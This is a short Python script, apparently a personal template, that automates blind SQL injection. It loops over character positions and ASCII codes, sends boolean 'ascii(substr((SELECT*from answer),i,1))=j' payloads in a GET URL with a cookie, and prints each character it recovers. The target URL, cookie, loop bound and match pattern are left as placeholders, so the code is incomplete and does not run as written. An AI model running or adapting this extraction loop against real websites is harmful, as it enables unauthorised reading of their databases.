# /usr/bin/bash
# made by jackson
# input url, cookie, blind sql injeciton payload
#

import requests
import re


s = []
url1 = "http://"
headers = {'cookie':'}
for i in range(1,#):
	for j in range(33,127):  #ascii
		url2 = "%'and(ascii(substr((SELECT*from answer),"+str(i)+",1))="+str(j)+")and'1%'='1"
		#data = {"user_name":"%' and (ascii(substr((SELECT * from answer),"+str(i)+",1)) = "+str(j)+") and '1%'='1"}
		fi_url = url1+url2
		req = requests.get(url=fi_url,headers=headers)
		response = req.text
		f = re.findall(#find string", response)
		if (f):
			print (chr(j))
			s.append(chr(j))
			break
			#s.append(f)
			#break
		else:
			continue
			#continue

